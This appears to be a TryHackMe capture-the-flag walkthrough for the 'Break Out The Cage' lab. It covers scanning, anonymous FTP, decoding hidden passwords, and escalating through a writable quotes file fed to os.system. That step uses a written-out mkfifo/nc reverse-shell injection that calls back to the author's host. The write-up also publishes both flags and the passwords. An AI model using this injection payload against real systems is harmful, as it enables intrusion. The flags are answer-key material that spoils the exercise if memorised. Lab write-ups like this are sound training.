# TryHackMe Break Out The Cage writeup

## `Nmap scan`

```ruby
nmap -sCV 10.10.49.15
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 13:47 EDT
Nmap scan report for 10.10.49.15
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.47.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
```

- **`ftp`**
- **`ssh`**
- **`http`**

---

## `gobusster`

```ruby
gobuster dir -u http://10.10.49.15/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x php,txt,html -k -t 50
```

<img width="1367" height="759" alt="image" src="https://github.com/user-attachments/assets/4b34229a-7d60-4905-9408-be19de602404" />

Checking the folders we can see:

- /images/ contains images used for the index page
- /html/ is empty
- /scripts/ contains some random dialogs
- /contracts/ has a “FolderNotInUse” file
- /autitions/ has a supposedly corrupted audition file

Checking the file we hear Nicholas Cage talking and a weird noise. After checking the noise in a spectrogram we can see some text:

<img width="1245" height="632" alt="image" src="https://github.com/user-attachments/assets/bb4cdca3-18e6-42dc-8922-6aea27ec7dd8" />

---

### key of Vigenere Cipher

```
namelesstwo
```

## ``connect to ftp``

```ruby
ftp 10.10.49.15
```

<img width="1197" height="495" alt="image" src="https://github.com/user-attachments/assets/665e90f1-f479-4e4c-825b-d0cfa39f9f44" />

---

```
cat dad_tasks
```

<img width="1218" height="503" alt="image" src="https://github.com/user-attachments/assets/153fb5a8-75e0-4e6f-ad3f-835b3e11e530" />

```ruby
echo 'UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds' | base64 -d
```

```ruby
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl       
```

<img width="1446" height="818" alt="image" src="https://github.com/user-attachments/assets/5baf05cf-72b5-4ab7-9e6b-3326591dda81" />

---

```
NAMELESSTWO
```

```ruby
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

```
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

---

---

## login to **`Weston`**

```ruby
ssh weston@10.10.49.15
```

<img width="841" height="639" alt="image" src="https://github.com/user-attachments/assets/31d00d45-9bd9-4ee8-98e3-be6917f11581" />

> ### notice that 

<img width="1208" height="239" alt="image" src="https://github.com/user-attachments/assets/901ba600-467e-4ac2-adaf-e6fc6d43aec9" />

## using **`linpeas`** found

<img width="872" height="182" alt="image" src="https://github.com/user-attachments/assets/6bb8d608-d652-4486-ac9b-5672e291101d" />

<img width="1065" height="498" alt="image" src="https://github.com/user-attachments/assets/af6fd293-3e7c-4b68-a779-c6447ed88bce" />

## Found the script

```python
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

```

> ## but we don't have permission to write on it

> # check **`.files`** found

<img width="702" height="178" alt="image" src="https://github.com/user-attachments/assets/497d0d48-cc96-4655-a6a5-be435958f409" />

## ahha i found that we have **`write permission`** on `.quotes`

```
echo "hacked;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.47.102 4444 >/tmp/f" > .quotes
```

<img width="1199" height="192" alt="image" src="https://github.com/user-attachments/assets/adf8b8d0-106a-48ee-9d57-1a2e94a7906c" />

<img width="990" height="233" alt="image" src="https://github.com/user-attachments/assets/ef5f2c22-15a3-46a2-a9cf-8061c6e9726c" />

```
bash -i
```

```
cage@national-treasure:~/email_backup$ cat email_3
cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage

```

## passsowrd of sean maybe

```
haiinspsyanileph
```

## first cat **`Super_Duper_checklist`**

<img width="894" height="290" alt="image" src="https://github.com/user-attachments/assets/2baf61c3-a585-460b-8811-62a673d68f10" />

````
THM{M37AL_0R_P3N_T35T1NG}
````

## using linpeas found the private key i used it to get better shell 

<img width="1177" height="630" alt="image" src="https://github.com/user-attachments/assets/2e271d49-8f74-4bca-96c3-3e83b0f412fe" />

## on last email notice that **`face`** word is repeated maybe it's key for cyipher

```
face
```

<img width="1402" height="406" alt="image" src="https://github.com/user-attachments/assets/4fff641c-7b29-44a8-9380-8e1cae77245d" />

```
cageisnotalegend
```

<img width="1017" height="343" alt="image" src="https://github.com/user-attachments/assets/070b69b8-4c5b-4518-8721-f7c2622ccf66" />

<img width="994" height="631" alt="image" src="https://github.com/user-attachments/assets/18bffb1c-8cb3-4938-93ef-64462c5f6757" />

```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

